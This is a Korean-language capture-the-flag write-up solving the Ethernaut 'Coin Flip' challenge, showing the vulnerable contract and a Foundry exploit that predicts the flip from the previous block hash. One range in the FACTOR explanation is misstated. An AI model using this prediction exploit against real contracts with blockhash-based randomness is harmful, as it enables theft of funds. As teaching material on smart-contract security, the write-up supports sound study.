---
title: Ethernaut > Coin Flip
author: ieuns
date: 2026-01-12 00:00:00 +0900
categories: [Web3, Solidity]
tags: [Ethernaut]
---

이번글에서는 [Ethernaut](https://ethernaut.openzeppelin.com/)의 'Coin Flip' 문제를 풀어보겠습니다.

## Coin Flip

바로 코드부터 확인해보겠습니다.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

## FACTOR의 역할

위 코드에서 `FACTOR`는 2^255 값을 가지고 있습니다.

왜 2^255인지 궁금했었는데, `blockhash`의 크기가 256비트 값 즉, 0 ~ (2^256 - 1) 인것을 보고 점점 느낌이 왔습니다.

coinFlip 변수는 blockValue / FACTOR 의 값을 가지므로, coinFlip은 무조건 0 또는 1이 됩니다.

민일 blockValue가 0 ~ (2^256 - 1)이라면 blockValue / FACTOR의 값은 0이, 2^255 ~ (2^256 -1)이라면 FACTOR의 값이 1로 설정되기 때문입니다.

## 무력한 lastHash Check
코드를 보면 같은 블록에서 두 번 호출하는 것을 막기 위해 lastHash가 존재하는 것을 확인할 수 있습니다.

하지만 이는 블록마다 한 번씩 호출하면 문제가 없음을 알 수 있습니다.


## Exploit
이를 통해 저희는 다음과 같은 공격 코드를 짜볼 수 있습니다.

```
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Coinflip.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";

contract Player {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _CoinflipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _CoinflipInstance.flip(side);

    }
}

contract CoinflipSolution is Script{
    CoinFlip public CoinflipInstance = CoinFlip(payable(0x4a3e2A3A2Cc828D2b5755521ea493138d18fFD25));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Player(CoinflipInstance);
        console.log("consecutiveWins: ", CoinflipInstance.consecutiveWins());
        vm.stopBroadcast();
    }
}
```
